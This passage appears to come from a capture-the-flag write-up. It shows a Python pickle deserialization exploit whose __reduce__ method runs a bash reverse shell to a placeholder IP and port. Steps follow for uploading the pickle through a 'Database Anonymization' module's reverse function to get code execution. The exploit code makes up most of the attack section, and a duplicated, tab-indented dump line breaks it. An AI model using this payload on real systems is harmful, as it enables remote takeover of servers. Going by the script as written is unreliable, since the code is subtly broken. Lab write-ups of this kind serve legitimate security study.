**The exlpoit:**

```import pickle
import os
import base64
import pickletools

class Exploit(object):
        def __reduce__(self):
                return (os.system, (("bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'"),))

with open("exploit.pickle", "wb") as f:
        pickle.dump(Exploit(), f, pickle.HIGHEST_PROTOCOL)
	pickle.dump(Exploit(), f, pickle.HIGHEST_PROTOCOL)

```
search and install the module : Database Anonymization , and then we'll upoload the exploit.pickle . 

[Image]({{ site.baseurl }}/images/obscure/18.png)

Once we have the module installed, we navigate to the settings page and select “Anonymize database” 

[Image]({{ site.baseurl }}/images/obscure/19.png)

We upload the “exploit.pickle” file generated our script and click on “Reverse the Database Anonymization” button.:

**N.b:**  to generate the pickle file we have to use python2.7 
**Syntax:** : `python2.7 exploit.py`
